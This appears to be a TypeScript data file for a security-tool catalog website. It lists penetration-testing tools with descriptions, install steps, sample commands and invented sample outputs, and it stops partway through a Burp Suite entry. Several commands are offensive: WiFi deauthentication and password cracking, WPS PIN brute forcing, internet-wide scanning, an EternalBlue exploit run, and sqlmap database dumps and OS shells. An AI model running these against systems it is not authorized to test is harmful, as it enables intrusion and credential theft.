export interface Tool {
  id: string;
  name: string;
  fullName: string;
  description: string;
  longDescription: string;
  category: string;
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced';
  lastUpdated: string;
  officialSite: string;
  icon: string;
  whatItIs: string;
  whatItsUsedFor: string;
  howItWorks: string;
  commands: string[];
  results: string[];
  useCases: string[];
  features: string[];
  installSteps: string[];
  basicUsage: string[];
}

export const toolsData: Record<string, Tool[]> = {
  "information-gathering": [
    {
      id: "nmap",
      name: "Nmap",
      fullName: "Network Mapper",
      description: "Network discovery and security auditing utility",
      longDescription: "Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. It provides a number of features for probing computer networks, including host discovery and service and operating system detection.",
      category: "Information Gathering",
      difficulty: "Beginner",
      lastUpdated: "2024-01-15",
      officialSite: "https://nmap.org",
      icon: "🔍",
      whatItIs: "A powerful network scanning tool used for network discovery and security auditing.",
      whatItsUsedFor: "Network administrators and security professionals use Nmap to identify what devices are running on their systems, discovering hosts that are available and the services they offer, finding open ports, and detecting security risks.",
      howItWorks: "Nmap sends specially crafted packets to the target host(s) and then analyzes their responses. Based on the responses, it can determine what services are running, what operating system is running, what type of device it is, and many other characteristics.",
      commands: [
        "nmap -sn 192.168.1.0/24",
        "nmap -A target.com",
        "nmap -sS -O target.com",
        "nmap -p- --open target.com"
      ],
      results: [
        "Host Discovery Complete: Found 12 active hosts",
        "Port Scan Complete: Open ports - 22, 80, 443, 8080",
        "OS Detection: Linux 3.2 - 4.9 (98% confidence)",
        "All ports scan: 65535 ports scanned, 4 open"
      ],
      useCases: [
        "Network inventory and asset management",
        "Monitoring host or service uptime",
        "Network security auditing",
        "Firewall testing and configuration"
      ],
      features: [
        "Host discovery",
        "Port scanning",
        "OS detection",
        "Service version detection",
        "Scriptable interaction with target"
      ],
      installSteps: [
        "Download from official website: nmap.org",
        "Install using package manager: sudo apt install nmap",
        "Verify installation: nmap --version",
        "Run first scan: nmap localhost"
      ],
      basicUsage: [
        "Basic ping scan: nmap -sn [target]",
        "TCP SYN scan: nmap -sS [target]",
        "Aggressive scan: nmap -A [target]",
        "Scan specific ports: nmap -p 80,443 [target]"
      ]
    },
    {
      id: "masscan",
      name: "Masscan",
      fullName: "Mass IP Port Scanner",
      description: "High-speed TCP port scanner capable of scanning the entire internet",
      longDescription: "Masscan is an Internet-scale port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second, from a single machine.",
      category: "Information Gathering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-10",
      officialSite: "https://github.com/robertdavidgraham/masscan",
      icon: "⚡",
      whatItIs: "An extremely fast port scanner designed for scanning large networks quickly.",
      whatItsUsedFor: "Used by penetration testers and security researchers to quickly identify open ports across large IP ranges, making it ideal for initial network reconnaissance.",
      howItWorks: "Uses its own TCP/IP stack to send SYN packets asynchronously, allowing it to scan at extremely high speeds without being limited by the operating system's network stack.",
      commands: [
        "masscan -p80,8080 10.0.0.0/8",
        "masscan -p1-65535 192.168.1.0/24 --rate=1000",
        "masscan -p80 0.0.0.0/0 --rate=10000",
        "masscan --top-ports 100 192.168.1.0/24"
      ],
      results: [
        "Discovered open port 80/tcp on 192.168.1.1",
        "Discovered open port 443/tcp on 192.168.1.5",
        "Discovered open port 22/tcp on 192.168.1.10",
        "Rate: 1000.00 packets/sec"
      ],
      useCases: [
        "Large-scale network reconnaissance",
        "Internet-wide port scanning",
        "Quick network asset discovery",
        "Security research and monitoring"
      ],
      features: [
        "Extremely high-speed scanning",
        "Custom TCP/IP stack",
        "Asynchronous transmission",
        "Banner grabbing capabilities",
        "Output in multiple formats"
      ],
      installSteps: [
        "Clone from GitHub: git clone https://github.com/robertdavidgraham/masscan",
        "Install dependencies: sudo apt install build-essential",
        "Compile: make",
        "Install: sudo make install"
      ],
      basicUsage: [
        "Basic scan: masscan -p80 192.168.1.0/24",
        "Multiple ports: masscan -p80,443,22 [target]",
        "Rate limiting: masscan -p80 [target] --rate=100",
        "Save results: masscan -p80 [target] -oX output.xml"
      ]
    },
    {
      id: "recon-ng",
      name: "Recon-ng",
      fullName: "Reconnaissance Framework",
      description: "Web reconnaissance framework with independent modules and database interaction",
      longDescription: "Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.",
      category: "Information Gathering",
      difficulty: "Advanced",
      lastUpdated: "2024-01-12",
      officialSite: "https://github.com/lanmaster53/recon-ng",
      icon: "🌐",
      whatItIs: "A comprehensive OSINT framework for web-based reconnaissance.",
      whatItsUsedFor: "Security professionals use Recon-ng to gather information about targets through various online sources, social media, and public databases for penetration testing and security assessments.",
      howItWorks: "Uses modular architecture with independent modules that can be chained together to gather comprehensive intelligence about targets from multiple online sources.",
      commands: [
        "recon-ng",
        "marketplace install all",
        "modules load recon/domains-hosts/hackertarget",
        "info"
      ],
      results: [
        "Recon-ng Framework loaded successfully",
        "47 modules installed from marketplace",
        "Module loaded: recon/domains-hosts/hackertarget",
        "Found 15 subdomains for target domain"
      ],
      useCases: [
        "Domain and subdomain enumeration",
        "Social media intelligence gathering",
        "Email address harvesting",
        "Company information research"
      ],
      features: [
        "Modular framework architecture",
        "Database integration",
        "API key management",
        "Custom module development",
        "Report generation"
      ],
      installSteps: [
        "Install Python 3: sudo apt install python3-pip",
        "Clone repository: git clone https://github.com/lanmaster53/recon-ng.git",
        "Install requirements: pip3 install -r requirements.txt",
        "Run framework: python3 recon-ng"
      ],
      basicUsage: [
        "Start framework: recon-ng",
        "Install modules: marketplace install all",
        "Load module: modules load [module_name]",
        "Run module: run"
      ]
    },
    {
      id: "theharvester",
      name: "theHarvester",
      fullName: "E-mail, Subdomain and People Names Harvester",
      description: "Tool for gathering e-mail accounts, subdomain names, virtual hosts, open ports and banners",
      longDescription: "theHarvester is a very simple to use, yet powerful and effective tool designed to be used in the early stages of a penetration test or red team engagement.",
      category: "Information Gathering",
      difficulty: "Beginner",
      lastUpdated: "2024-01-08",
      officialSite: "https://github.com/laramies/theHarvester",
      icon: "📧",
      whatItIs: "An OSINT tool that gathers emails, subdomains, hosts, employee names, open ports and banners from different public sources.",
      whatItsUsedFor: "Used in the reconnaissance phase of penetration testing to gather information about a target organization from public sources like search engines, PGP key servers, and social networks.",
      howItWorks: "Queries various search engines and public databases to collect information associated with a target domain, including email addresses, subdomains, and employee information.",
      commands: [
        "theharvester -d example.com -l 500 -b google",
        "theharvester -d example.com -b all",
        "theharvester -d example.com -b linkedin",
        "theharvester -d example.com -l 200 -b shodan"
      ],
      results: [
        "Found 25 email addresses for example.com",
        "Discovered 12 subdomains",
        "Located 8 employee profiles on LinkedIn",
        "Identified 3 open ports via Shodan"
      ],
      useCases: [
        "Email address enumeration",
        "Subdomain discovery",
        "Employee information gathering",
        "Social media reconnaissance"
      ],
      features: [
        "Multiple search engine support",
        "Social media integration",
        "Subdomain enumeration",
        "Email harvesting",
        "Export to various formats"
      ],
      installSteps: [
        "Install Python 3: sudo apt install python3-pip",
        "Clone repository: git clone https://github.com/laramies/theHarvester.git",
        "Install requirements: pip3 install -r requirements.txt",
        "Run tool: python3 theHarvester.py"
      ],
      basicUsage: [
        "Basic harvest: theharvester -d [domain] -b google",
        "All sources: theharvester -d [domain] -b all",
        "Limit results: theharvester -d [domain] -l 100 -b google",
        "Save output: theharvester -d [domain] -b google -f output.html"
      ]
    },
    {
      id: "maltego",
      name: "Maltego",
      fullName: "Maltego Community Edition",
      description: "Interactive data mining tool for link analysis and intelligence gathering",
      longDescription: "Maltego is an interactive data mining tool that renders directed graphs for link analysis. The tool is used in online investigations for finding relationships between pieces of information from various sources located on the Internet.",
      category: "Information Gathering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-20",
      officialSite: "https://www.maltego.com",
      icon: "🕸️",
      whatItIs: "A visual link analysis tool that helps investigators see relationships between entities.",
      whatItsUsedFor: "Used by investigators, security professionals, and researchers to visualize and understand complex relationships between people, companies, websites, and other entities.",
      howItWorks: "Uses transforms to query various data sources and create visual graphs showing relationships between entities, making complex data easier to understand and analyze.",
      commands: [
        "Run Maltego GUI application",
        "Create new graph",
        "Add entity (Person/Company/Domain)",
        "Run transforms on selected entities"
      ],
      results: [
        "Generated link analysis graph with 50 entities",
        "Discovered 12 related companies",
        "Found social media connections",
        "Identified shared infrastructure"
      ],
      useCases: [
        "Link analysis and relationship mapping",
        "Digital forensics investigations",
        "Fraud investigations",
        "Cyber threat intelligence"
      ],
      features: [
        "Visual graph interface",
        "Real-time data transforms",
        "Collaboration capabilities",
        "Custom entity creation",
        "Export functionality"
      ],
      installSteps: [
        "Download from official website",
        "Create free account",
        "Install application package",
        "Launch and authenticate"
      ],
      basicUsage: [
        "Create new graph",
        "Add person/company entity",
        "Right-click to run transforms",
        "Analyze resulting connections"
      ]
    },
    {
      id: "shodan",
      name: "Shodan",
      fullName: "Shodan Search Engine",
      description: "Search engine for Internet-connected devices and services",
      longDescription: "Shodan is a search engine that lets users find specific types of computers connected to the internet using a variety of filters. It has been called the 'Google for hackers' because it can be used to find vulnerable systems.",
      category: "Information Gathering",
      difficulty: "Beginner",
      lastUpdated: "2024-01-18",
      officialSite: "https://www.shodan.io",
      icon: "📡",
      whatItIs: "A search engine for finding Internet-connected devices and their exposed services.",
      whatItsUsedFor: "Security researchers and penetration testers use Shodan to identify exposed devices, services, and potential vulnerabilities across the internet.",
      howItWorks: "Continuously scans the entire IPv4 address space and indexes the banners and metadata from services it finds, making this information searchable through its web interface and API.",
      commands: [
        "shodan search apache",
        "shodan host 8.8.8.8",
        "shodan count country:US",
        "shodan download --limit 1000 webcam"
      ],
      results: [
        "Found 2,341,567 Apache servers",
        "Host 8.8.8.8 - Google DNS server details",
        "Found 45,123,891 hosts in United States",
        "Downloaded 1000 webcam results"
      ],
      useCases: [
        "Internet asset discovery",
        "Vulnerability research",
        "Network security monitoring",
        "IoT device identification"
      ],
      features: [
        "Global internet scanning",
        "Real-time search results",
        "Historical data access",
        "API integration",
        "Advanced filtering options"
      ],
      installSteps: [
        "Create account at shodan.io",
        "Install CLI: pip install shodan",
        "Initialize API key: shodan init [API_KEY]",
        "Test connection: shodan info"
      ],
      basicUsage: [
        "Web search: Use shodan.io interface",
        "CLI search: shodan search [query]",
        "Host lookup: shodan host [IP]",
        "Count results: shodan count [query]"
      ]
    }
  ],

  "wireless-hacking": [
    {
      id: "aircrack-ng",
      name: "Aircrack-ng",
      fullName: "Aircrack-ng Suite",
      description: "Complete suite of tools to assess WiFi network security",
      longDescription: "Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security: monitoring, attacking, testing, and cracking.",
      category: "Wireless Hacking",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-14",
      officialSite: "https://aircrack-ng.org",
      icon: "📡",
      whatItIs: "A comprehensive WiFi network security assessment toolkit.",
      whatItsUsedFor: "Security professionals use Aircrack-ng to test the security of wireless networks, identify vulnerabilities, and assess WiFi encryption strength.",
      howItWorks: "The suite captures and analyzes wireless traffic, performs attacks on WiFi networks, and attempts to crack encryption keys using various techniques including dictionary attacks and brute force.",
      commands: [
        "airodump-ng wlan0mon",
        "aircrack-ng capture.cap -w wordlist.txt",
        "aireplay-ng -0 5 -a [BSSID] wlan0mon",
        "airmon-ng start wlan0"
      ],
      results: [
        "Monitoring Mode Activated: Interface wlan0mon ready",
        "WPA Handshake Captured: 4-way handshake complete",
        "Key Found! Password: 'admin123' (took 2.3 minutes)",
        "Deauth attack successful: 5 packets sent"
      ],
      useCases: [
        "WiFi penetration testing",
        "Wireless security auditing",
        "Network troubleshooting",
        "Security awareness training"
      ],
      features: [
        "Packet capture and analysis",
        "WEP and WPA/WPA2 cracking",
        "Deauthentication attacks",
        "Fake access point creation",
        "Statistical analysis"
      ],
      installSteps: [
        "Install on Kali: sudo apt update && sudo apt install aircrack-ng",
        "Ubuntu/Debian: sudo apt install aircrack-ng",
        "Check wireless interface: iwconfig",
        "Enable monitor mode: airmon-ng start wlan0"
      ],
      basicUsage: [
        "Start monitor mode: airmon-ng start wlan0",
        "Scan networks: airodump-ng wlan0mon",
        "Capture handshake: airodump-ng -c [channel] --bssid [MAC] -w capture wlan0mon",
        "Crack password: aircrack-ng capture.cap -w wordlist.txt"
      ]
    },
    {
      id: "kismet",
      name: "Kismet",
      fullName: "Kismet Wireless Network Detector",
      description: "Wireless network detector, sniffer, and intrusion detection system",
      longDescription: "Kismet is a wireless network and device detector, sniffer, wardriving tool, and WIDS (wireless intrusion detection) framework.",
      category: "Wireless Hacking",
      difficulty: "Advanced",
      lastUpdated: "2024-01-11",
      officialSite: "https://www.kismetwireless.net",
      icon: "📊",
      whatItIs: "A passive wireless network detector and packet analyzer with intrusion detection capabilities.",
      whatItsUsedFor: "Used by security professionals for wireless network monitoring, wardriving, detecting rogue access points, and wireless intrusion detection.",
      howItWorks: "Passively monitors wireless traffic without sending any packets, collecting information about wireless networks, devices, and detecting anomalous behavior.",
      commands: [
        "kismet",
        "kismet -c wlan0",
        "kismet_server",
        "kismet_client"
      ],
      results: [
        "Detected 15 wireless networks",
        "Found 3 hidden SSIDs",
        "Identified 25 wireless clients",
        "Detected potential rogue AP"
      ],
      useCases: [
        "Wireless network monitoring",
        "Rogue access point detection",
        "Wardriving activities",
        "Wireless intrusion detection"
      ],
      features: [
        "Passive network detection",
        "Multiple capture source support",
        "Real-time monitoring",
        "GPS integration",
        "Plugin architecture"
      ],
      installSteps: [
        "Install: sudo apt install kismet",
        "Add user to kismet group: sudo usermod -aG kismet $USER",
        "Configure sources: edit /etc/kismet/kismet.conf",
        "Start server: kismet"
      ],
      basicUsage: [
        "Start Kismet: kismet",
        "Access web interface: http://localhost:2501",
        "Configure data sources",
        "Monitor wireless activity"
      ]
    },
    {
      id: "wifite",
      name: "Wifite",
      fullName: "Automated Wireless Attack Tool",
      description: "Automated wireless auditor designed to use all known methods for retrieving passwords",
      longDescription: "Wifite is designed to use all known methods for retrieving the password of a wireless access point (router). These methods include WPS pin cracking and WPA/WPA2 handshake capture and cracking.",
      category: "Wireless Hacking",
      difficulty: "Beginner",
      lastUpdated: "2024-01-16",
      officialSite: "https://github.com/derv82/wifite2",
      icon: "🎯",
      whatItIs: "An automated tool that streamlines wireless penetration testing by combining multiple attack methods.",
      whatItsUsedFor: "Used by penetration testers to quickly assess the security of multiple wireless networks using automated attack sequences.",
      howItWorks: "Automatically discovers wireless networks, selects appropriate attack methods based on security type, and attempts to crack passwords using multiple techniques.",
      commands: [
        "wifite",
        "wifite --wps --wpa",
        "wifite -i wlan0mon",
        "wifite --dict /path/to/wordlist.txt"
      ],
      results: [
        "Found 8 wireless targets",
        "WPS attack successful on NETGEAR_5G",
        "WPA handshake captured for Home_WiFi",
        "Password cracked: 'password123'"
      ],
      useCases: [
        "Automated wireless security testing",
        "Quick network vulnerability assessment",
        "Educational wireless security demonstrations",
        "Red team wireless testing"
      ],
      features: [
        "Automated attack selection",
        "Multiple attack methods",
        "Progress monitoring",
        "Result logging",
        "User-friendly interface"
      ],
      installSteps: [
        "Install dependencies: sudo apt install aircrack-ng reaver",
        "Clone repository: git clone https://github.com/derv82/wifite2.git",
        "Install: sudo python setup.py install",
        "Run: wifite"
      ],
      basicUsage: [
        "Start scan: wifite",
        "Select targets from list",
        "Choose attack methods",
        "Monitor attack progress"
      ]
    },
    {
      id: "fern-wifi-cracker",
      name: "Fern WiFi Cracker",
      fullName: "Fern WiFi Cracker GUI Tool",
      description: "Wireless security auditing and attack software with GUI interface",
      longDescription: "Fern WiFi Cracker is a wireless security auditing and attack software program written using the Python Programming Language and the Python Qt GUI library.",
      category: "Wireless Hacking",
      difficulty: "Beginner",
      lastUpdated: "2024-01-09",
      officialSite: "https://github.com/savio-code/fern-wifi-cracker",
      icon: "🌿",
      whatItIs: "A graphical wireless network security auditing tool with an intuitive interface.",
      whatItsUsedFor: "Used by security professionals and students to learn and perform wireless network security testing through an easy-to-use graphical interface.",
      howItWorks: "Provides a GUI frontend to various wireless attack tools, making wireless penetration testing more accessible to users who prefer graphical interfaces over command-line tools.",
      commands: [
        "fern-wifi-cracker",
        "Select wireless interface",
        "Enable monitor mode",
        "Start network scan"
      ],
      results: [
        "GUI launched successfully",
        "Monitor mode enabled on wlan0",
        "Scanning for wireless networks...",
        "Found 12 networks in range"
      ],
      useCases: [
        "Educational wireless security learning",
        "GUI-based wireless testing",
        "Beginner-friendly penetration testing",
        "Wireless security demonstrations"
      ],
      features: [
        "Graphical user interface",
        "Automated attack execution",
        "Real-time monitoring",
        "Attack result logging",
        "Multiple attack types"
      ],
      installSteps: [
        "Install Python and Qt: sudo apt install python3 python3-pyqt4",
        "Download from GitHub or Kali repos",
        "Install: sudo apt install fern-wifi-cracker",
        "Launch: fern-wifi-cracker"
      ],
      basicUsage: [
        "Launch application: fern-wifi-cracker",
        "Select wireless interface",
        "Enable monitor mode",
        "Start scanning and select targets"
      ]
    },
    {
      id: "reaver",
      name: "Reaver",
      fullName: "WPS PIN Attack Tool",
      description: "Brute force attack tool against WiFi Protected Setup (WPS)",
      longDescription: "Reaver implements a brute force attack against WiFi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases.",
      category: "Wireless Hacking",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-13",
      officialSite: "https://github.com/t6x/reaver-wps-fork-t6x",
      icon: "🔓",
      whatItIs: "A specialized tool for exploiting WPS vulnerabilities to recover WiFi passwords.",
      whatItsUsedFor: "Used to test the security of WPS-enabled routers by exploiting the WPS PIN vulnerability to recover WPA/WPA2 passwords.",
      howItWorks: "Exploits a design flaw in WPS that allows attackers to brute force the WPS PIN, which can then be used to recover the WPA/WPA2 passphrase.",
      commands: [
        "reaver -i wlan0mon -b [BSSID] -vv",
        "reaver -i wlan0mon -b [BSSID] -c [channel] -vv",
        "reaver -i wlan0mon -b [BSSID] -p [PIN] -vv",
        "wash -i wlan0mon"
      ],
      results: [
        "WPS PIN found: 12345670",
        "WPA PSK: 'MySecurePassword123'",
        "AP SSID: 'Home_Network'",
        "Authentication successful"
      ],
      useCases: [
        "WPS vulnerability testing",
        "Wireless penetration testing",
        "Router security assessment",
        "Security awareness demonstrations"
      ],
      features: [
        "WPS PIN brute forcing",
        "Automatic retry logic",
        "Session saving/resuming",
        "Multiple attack modes",
        "Progress monitoring"
      ],
      installSteps: [
        "Install: sudo apt install reaver",
        "Enable monitor mode: airmon-ng start wlan0",
        "Scan for WPS networks: wash -i wlan0mon",
        "Start attack: reaver -i wlan0mon -b [BSSID] -vv"
      ],
      basicUsage: [
        "Scan WPS networks: wash -i wlan0mon",
        "Start attack: reaver -i wlan0mon -b [BSSID] -vv",
        "Monitor progress and wait for results",
        "Save session for later resumption"
      ]
    }
  ],

  "social-engineering": [
    {
      id: "social-engineer-toolkit",
      name: "SET",
      fullName: "Social Engineer Toolkit",
      description: "Framework designed for social engineering attacks and penetration testing",
      longDescription: "The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element commonly used today.",
      category: "Social Engineering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-17",
      officialSite: "https://github.com/trustedsec/social-engineer-toolkit",
      icon: "🎭",
      whatItIs: "A comprehensive framework for conducting social engineering attacks and testing human factors in security.",
      whatItsUsedFor: "Used by penetration testers and security professionals to test organizational security awareness and conduct authorized social engineering assessments.",
      howItWorks: "Provides various attack vectors including spear-phishing, website cloning, credential harvesting, and payload generation to test human vulnerabilities.",
      commands: [
        "setoolkit",
        "1) Social-Engineering Attacks",
        "2) Website Attack Vectors",
        "3) Credential Harvester Attack Method"
      ],
      results: [
        "SET Framework loaded successfully",
        "Website clone created: facebook.com",
        "Credential harvester listening on port 80",
        "Captured 3 sets of credentials"
      ],
      useCases: [
        "Phishing campaign testing",
        "Security awareness training",
        "Social engineering assessments",
        "Employee security testing"
      ],
      features: [
        "Website cloning",
        "Spear-phishing campaigns",
        "Credential harvesting",
        "Payload generation",
        "SMS spoofing"
      ],
      installSteps: [
        "Clone repository: git clone https://github.com/trustedsec/social-engineer-toolkit/",
        "Navigate to directory: cd social-engineer-toolkit",
        "Install: sudo python setup.py install",
        "Run: setoolkit"
      ],
      basicUsage: [
        "Launch SET: setoolkit",
        "Select attack vector from menu",
        "Configure target and payload",
        "Execute and monitor results"
      ]
    },
    {
      id: "gophish",
      name: "Gophish",
      fullName: "Open-Source Phishing Toolkit",
      description: "Open-source phishing toolkit designed for businesses and penetration testers",
      longDescription: "Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training.",
      category: "Social Engineering",
      difficulty: "Beginner",
      lastUpdated: "2024-01-19",
      officialSite: "https://getgophish.com",
      icon: "🎣",
      whatItIs: "A professional phishing framework with campaign management and reporting capabilities.",
      whatItsUsedFor: "Used by organizations and security teams to conduct authorized phishing simulations, security awareness training, and measure susceptibility to phishing attacks.",
      howItWorks: "Provides a web-based interface for creating and managing phishing campaigns, tracking user interactions, and generating detailed reports on campaign effectiveness.",
      commands: [
        "./gophish",
        "Access web interface: https://localhost:3333",
        "Create new campaign",
        "Configure email templates and landing pages"
      ],
      results: [
        "Gophish server started on port 3333",
        "Campaign 'Security Test' created",
        "100 emails sent successfully",
        "25% click rate, 10% credential submission rate"
      ],
      useCases: [
        "Phishing simulation campaigns",
        "Security awareness training",
        "Employee security assessment",
        "Incident response training"
      ],
      features: [
        "Campaign management",
        "Email template creation",
        "Landing page hosting",
        "Real-time reporting",
        "User tracking"
      ],
      installSteps: [
        "Download latest release from GitHub",
        "Extract archive: tar -xzf gophish.tar.gz",
        "Make executable: chmod +x gophish",
        "Run: ./gophish"
      ],
      basicUsage: [
        "Start server: ./gophish",
        "Access web UI: https://localhost:3333",
        "Create user groups and templates",
        "Launch phishing campaign"
      ]
    },
    {
      id: "beef",
      name: "BeEF",
      fullName: "Browser Exploitation Framework",
      description: "Penetration testing tool that focuses on web browser exploitation",
      longDescription: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. BeEF hooks web browsers and has them run JavaScript payloads.",
      category: "Social Engineering",
      difficulty: "Advanced",
      lastUpdated: "2024-01-15",
      officialSite: "https://beefproject.com",
      icon: "🥩",
      whatItIs: "A browser exploitation framework that targets client-side vulnerabilities through web browsers.",
      whatItsUsedFor: "Used by penetration testers to demonstrate and exploit client-side vulnerabilities, test browser security, and assess the security posture of web applications.",
      howItWorks: "Injects malicious JavaScript into web pages to create hooks with victim browsers, allowing execution of various attack modules and information gathering techniques.",
      commands: [
        "./beef",
        "Access control panel: http://localhost:3000/ui/panel",
        "Insert hook script into target website",
        "Execute attack modules on hooked browsers"
      ],
      results: [
        "BeEF server started successfully",
        "Browser hooked: Chrome on Windows 10",
        "Keylogger module executed",
        "Social engineering popup displayed"
      ],
      useCases: [
        "Client-side penetration testing",
        "Browser security assessment",
        "Social engineering demonstrations",
        "Web application security testing"
      ],
      features: [
        "Browser hooking",
        "JavaScript payload execution",
        "Information gathering",
        "Browser exploitation",
        "Network pivoting"
      ],
      installSteps: [
        "Install Ruby: sudo apt install ruby-dev",
        "Clone repository: git clone https://github.com/beefproject/beef",
        "Install gems: cd beef && bundle install",
        "Start BeEF: ./beef"
      ],
      basicUsage: [
        "Start BeEF: ./beef",
        "Access panel: http://localhost:3000/ui/panel",
        "Insert hook into target page",
        "Execute modules on hooked browsers"
      ]
    },
    {
      id: "king-phisher",
      name: "King Phisher",
      fullName: "Phishing Campaign Toolkit",
      description: "Tool for testing and promoting user awareness through simulated phishing attacks",
      longDescription: "King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. It features an easy to use, yet very flexible architecture allowing for rapid deployment and customization.",
      category: "Social Engineering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-12",
      officialSite: "https://github.com/securestate/king-phisher",
      icon: "👑",
      whatItIs: "A comprehensive phishing campaign toolkit with advanced customization and tracking capabilities.",
      whatItsUsedFor: "Used by security professionals to create sophisticated phishing simulations for testing employee awareness and conducting security assessments.",
      howItWorks: "Provides a client-server architecture for managing phishing campaigns with customizable templates, real-time tracking, and detailed analytics.",
      commands: [
        "king-phisher-server",
        "king-phisher-client",
        "Configure SMTP settings",
        "Create and launch campaign"
      ],
      results: [
        "King Phisher server initialized",
        "SMTP server configured successfully",
        "Campaign targeting 500 employees launched",
        "Real-time statistics available in dashboard"
      ],
      useCases: [
        "Enterprise phishing simulations",
        "Security awareness training",
        "Red team operations",
        "Compliance testing"
      ],
      features: [
        "Campaign management",
        "Template customization",
        "Real-time tracking",
        "Geographic mapping",
        "Detailed reporting"
      ],
      installSteps: [
        "Install dependencies: sudo apt install python3-gi",
        "Clone repository: git clone https://github.com/securestate/king-phisher",
        "Install: sudo python3 setup.py install",
        "Configure: king-phisher-server --config"
      ],
      basicUsage: [
        "Start server: king-phisher-server",
        "Launch client: king-phisher-client",
        "Create campaign with templates",
        "Monitor results in real-time"
      ]
    },
    {
      id: "maltego-social-links",
      name: "Maltego Social Links",
      fullName: "Social Media Intelligence Tool",
      description: "Social media investigation and intelligence gathering platform",
      longDescription: "Maltego Social Links is specialized for social media investigations, providing transforms to gather intelligence from various social media platforms and online sources.",
      category: "Social Engineering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-14",
      officialSite: "https://www.maltego.com",
      icon: "🔗",
      whatItIs: "A specialized version of Maltego focused on social media intelligence and relationship mapping.",
      whatItsUsedFor: "Used by investigators and security professionals to map social media relationships, gather OSINT, and understand social connections for security assessments.",
      howItWorks: "Uses specialized transforms to query social media platforms and create visual graphs showing relationships between people, accounts, and information.",
      commands: [
        "Launch Maltego Social Links",
        "Add person entity",
        "Run social media transforms",
        "Analyze relationship graphs"
      ],
      results: [
        "Found 25 social media profiles",
        "Mapped connections between 50 individuals",
        "Identified shared photos and locations",
        "Generated comprehensive social network map"
      ],
      useCases: [
        "Social media investigations",
        "OSINT gathering",
        "Background verification",
        "Social engineering reconnaissance"
      ],
      features: [
        "Social media platform integration",
        "Relationship visualization",
        "Data correlation",
        "Export capabilities",
        "Collaboration tools"
      ],
      installSteps: [
        "Download from official website",
        "Install application package",
        "Register for account",
        "Configure social media API access"
      ],
      basicUsage: [
        "Create new investigation",
        "Add target entities",
        "Run social media transforms",
        "Analyze and export results"
      ]
    }
  ],

  "exploitation": [
    {
      id: "metasploit",
      name: "Metasploit",
      fullName: "Metasploit Framework",
      description: "Penetration testing platform for finding, exploiting, and validating vulnerabilities",
      longDescription: "The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code.",
      category: "Exploitation",
      difficulty: "Advanced",
      lastUpdated: "2024-01-20",
      officialSite: "https://www.metasploit.com",
      icon: "🚀",
      whatItIs: "A comprehensive penetration testing framework with exploit development and execution capabilities.",
      whatItsUsedFor: "Used by penetration testers and security researchers to test system vulnerabilities, develop exploits, and validate security controls.",
      howItWorks: "Provides a modular framework with exploits, payloads, encoders, and auxiliary modules that can be combined to test and exploit vulnerabilities.",
      commands: [
        "msfconsole",
        "search ms17-010",
        "use exploit/windows/smb/ms17_010_eternalblue",
        "set RHOSTS 192.168.1.100"
      ],
      results: [
        "Metasploit Framework started",
        "Found exploit: exploit/windows/smb/ms17_010_eternalblue",
        "Target set: 192.168.1.100",
        "Meterpreter session opened successfully"
      ],
      useCases: [
        "Vulnerability exploitation",
        "Penetration testing",
        "Security research",
        "Payload development"
      ],
      features: [
        "Extensive exploit database",
        "Payload generation",
        "Post-exploitation modules",
        "Session management",
        "Automated exploitation"
      ],
      installSteps: [
        "Install on Kali: Already pre-installed",
        "Ubuntu: sudo apt install metasploit-framework",
        "Initialize database: msfdb init",
        "Start framework: msfconsole"
      ],
      basicUsage: [
        "Start console: msfconsole",
        "Search exploits: search [vulnerability]",
        "Use exploit: use [exploit_path]",
        "Set options and run: exploit"
      ]
    },
    {
      id: "sqlmap",
      name: "SQLMap",
      fullName: "Automatic SQL Injection Tool",
      description: "Automatic SQL injection and database takeover tool",
      longDescription: "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.",
      category: "Exploitation",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-18",
      officialSite: "http://sqlmap.org",
      icon: "💉",
      whatItIs: "An automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.",
      whatItsUsedFor: "Used by penetration testers and security researchers to identify and exploit SQL injection vulnerabilities in web applications and databases.",
      howItWorks: "Automatically detects SQL injection points, fingerprints databases, extracts data, and can even provide shell access through SQL injection vulnerabilities.",
      commands: [
        "sqlmap -u 'http://example.com/page.php?id=1'",
        "sqlmap -u 'http://example.com/page.php?id=1' --dbs",
        "sqlmap -u 'http://example.com/page.php?id=1' -D database --tables",
        "sqlmap -u 'http://example.com/page.php?id=1' --os-shell"
      ],
      results: [
        "SQL injection vulnerability detected",
        "Database: MySQL 5.7.29",
        "Available databases: [3] information_schema, test, users",
        "OS shell obtained: www-data@webserver"
      ],
      useCases: [
        "SQL injection testing",
        "Database security assessment",
        "Web application penetration testing",
        "Database enumeration"
      ],
      features: [
        "Automatic injection detection",
        "Database fingerprinting",
        "Data extraction",
        "File system access",
        "OS command execution"
      ],
      installSteps: [
        "Install Python: sudo apt install python3",
        "Clone repository: git clone https://github.com/sqlmapproject/sqlmap.git",
        "Navigate to directory: cd sqlmap",
        "Run: python sqlmap.py"
      ],
      basicUsage: [
        "Basic test: sqlmap -u '[URL]'",
        "Enumerate databases: sqlmap -u '[URL]' --dbs",
        "Extract tables: sqlmap -u '[URL]' -D [db] --tables",
        "Dump data: sqlmap -u '[URL]' -D [db] -T [table] --dump"
      ]
    },
    {
      id: "burp-suite",
      name: "Burp Suite",
      fullName: "Burp Suite Professional",
